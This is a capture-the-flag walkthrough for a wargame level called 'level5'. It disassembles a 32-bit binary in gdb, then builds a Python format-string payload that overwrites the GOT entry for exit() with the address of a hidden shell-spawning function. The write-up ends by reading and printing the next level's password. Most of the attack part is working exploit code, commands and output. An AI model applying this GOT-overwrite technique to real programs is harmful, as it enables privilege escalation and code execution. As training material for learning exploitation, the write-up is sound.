# Level5

    (gdb) disas main 
    Dump of assembler code for function main:
        0x08048504 <+0>:	push   %ebp
        0x08048505 <+1>:	mov    %esp,%ebp
        0x08048507 <+3>:	and    $0xfffffff0,%esp
        0x0804850a <+6>:	call   0x80484c2 <n>
        0x0804850f <+11>:	leave  
        0x08048510 <+12>:	ret    
    End of assembler dump.
    (gdb) disas n
    Dump of assembler code for function n:
        0x080484c2 <+0>:	push   %ebp
        0x080484c3 <+1>:	mov    %esp,%ebp
        0x080484c5 <+3>:	sub    $0x218,%esp
        0x080484cb <+9>:	mov    0x8049848,%eax
        0x080484d0 <+14>:	mov    %eax,0x8(%esp)
        0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
        0x080484dc <+26>:	lea    -0x208(%ebp),%eax
        0x080484e2 <+32>:	mov    %eax,(%esp)
        0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
        0x080484ea <+40>:	lea    -0x208(%ebp),%eax
        0x080484f0 <+46>:	mov    %eax,(%esp)
        0x080484f3 <+49>:	call   0x8048380 <printf@plt>
        0x080484f8 <+54>:	movl   $0x1,(%esp)
        0x080484ff <+61>:	call   0x80483d0 <exit@plt>
    End of assembler dump.

Another printf exploit. This time not much happening besides the printf call. However we can find a function o() which is never called

    (gdb) disas o
    Dump of assembler code for function o:
        0x080484a4 <+0>:	push   %ebp
        0x080484a5 <+1>:	mov    %esp,%ebp
        0x080484a7 <+3>:	sub    $0x18,%esp
        0x080484aa <+6>:	movl   $0x80485f0,(%esp)
        0x080484b1 <+13>:	call   0x80483b0 <system@plt>
        0x080484b6 <+18>:	movl   $0x1,(%esp)
        0x080484bd <+25>:	call   0x8048390 <_exit@plt>
    End of assembler dump.

This function will very conveniently run a shell when called.
Another interesting thing is the use of the exit() function.

The goal will be very similar to the previous 2 levels, however this time instead of setting the value to a number to pass the equality check, we will pass the address of the o function and try to execute it. Since this address is equal to 134 513 828 in base 10, it would take quite a while to print all these characters (and also a few hundreds Mb).

The way we're gonna do it is by exploiting the exit() function. Since it's a funtion from the libc, it won't be directly included in the binary, but will use the global offset table (GOT) that will link the address stored in the program to the real exit() function. But we can exploit this GOT and redirect it to the o() function instead. In simpler terms, instead of executing exit, we will execute o().

First of all we want to find the first occurence of our input in the stack, like we previously did :

    $ ./level5 
    AAAA %x %x %x %x %x %x
    AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825

It corresponds to the 4th %x.

Since there will be quite a lot of stuff needed to craft our payload, let's write a python script.

We start by saving the address of o() for later use (1)
Then we need to find the GOT. In the n() function, we see the call to exit at the procedure linkage table (PLT) :

        0x080484ff <+61>:	call   0x80483d0 <exit@plt>

By dissassembling it, we can now see the address referenced in the first instruction with the jump, that tries to reference the address of exit from glibc:

    (gdb) disas 0x80483d0
    Dump of assembler code for function exit@plt:
        0x080483d0 <+0>:	jmp    *0x8049838
        0x080483d6 <+6>:	push   $0x28
        0x080483db <+11>:	jmp    0x8048370
    End of assembler dump.

Let's examine this address :

    (gdb) x 0x8049838
    0x8049838 <exit@got.plt>:	0x080483d6

Here we see the got address. We store it in our script as well for later use (2)

Next, we need to get the size of the buffer. We can send some tests like we did in the previous levels. We can also find it here : 

        0x080484dc <+26>:	lea    -0x208(%ebp),%eax

Basically this is an instruction to load the effective address -0x208(%ebp) to EAX. Since this effective address refers to the start of the buffer, 0x208 is the offset of the buffer from the EPB register. Which is 520 in decimal.
Now we can add padding to our script (3)

Time to craft the payload. We start by packing the EXIT_PLT address into a binary string using the struct library (4)
(I is the format string specifying that the value to be packed is an unsigned int)

Now, instead of padding with over 100 millions characters, we can split the address in 2: 0x80484a4 will be composed of 0x804 and 0x84a4. Which are significantly shorter. We can start padding with 0x84a4 characters to get the lowest half of the address, then use a little trick to get the biggest one.

For the first half, we can do like we did previously, and tweak around to get the precise address (5)

We partially win once we see this :

    (gdb) i r
    eax            0x84a4	33956 <-- lowest half of the exit_plt address
    [...]

Now the hard stuff. We need to add the other half, which will be 0x0804. We now want to address the 5th element on the stack (6). If we first try with a very low number, we see that the number is already wayyy above 0x0804. But how can we get 0x0804 if we can only *add* numbers ? Since we always write 4 bytes (0x0804 is 2 bytes or 16 -bit), it means we actually wrote this number : 0x00000804, messing up with data stored previously in the GOT table, but who cares. And nothing prevents us to use this number instead : 0x00010804. The GOT will only see the last 2 bytes anyway, 0x0804. Now, we simply need to substract the value we got when using a very low number from 0x00010804 (without forgetting that we already sent the very low number to find the first value, so we take it into account) (7). Again it might need some tweaks, we had to change the values of the lowest half once again after this operation because it modified it.
We also set the offset of 2 bytes of the exit_plt address (8)

Using gdb, once eax is equal to the address we wanted, we don't touch it anymore because it was painful enough :

    (gdb) i r
    eax            0x80484a4	134513828 <-- lowest half of the o function address
    [...]

Here is the final python script:

    import struct

    FCT_O = 0x80484a4       #(1)
    EXIT_PLT = 0x8049838    #(2)

    def pad(s):
        return s+"Y"*(520-len(s))   #(3)

    exploit = ""
    exploit += struct.pack("I",EXIT_PLT)    #(4)
    exploit += struct.pack("I",EXIT_PLT+2)  #(8)
    exploit += "AAAABBBBCCCC"               # only used to find the occurence of the input string on the stack, but removing it will require to tweak the paddings length once more so I kept it
    exploit += "%4$33936x"                  #(5)
    exploit += "%4$n"                       #(5)
    exploit += "%33632x"                    #(7)
    exploit += "%5$n"                       #(6)

    print pad(exploit)

[source](https://www.youtube.com/watch?v=t1LH9D5cuK4)

Now that our brain has melted, we just need to run the program.

    $ python exploit.py > payload
    $ cat payload - | ./level5 
    [... not 17 millions characters this time but still quite a lot ...]
    cd ../level6
    cat .pass
    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
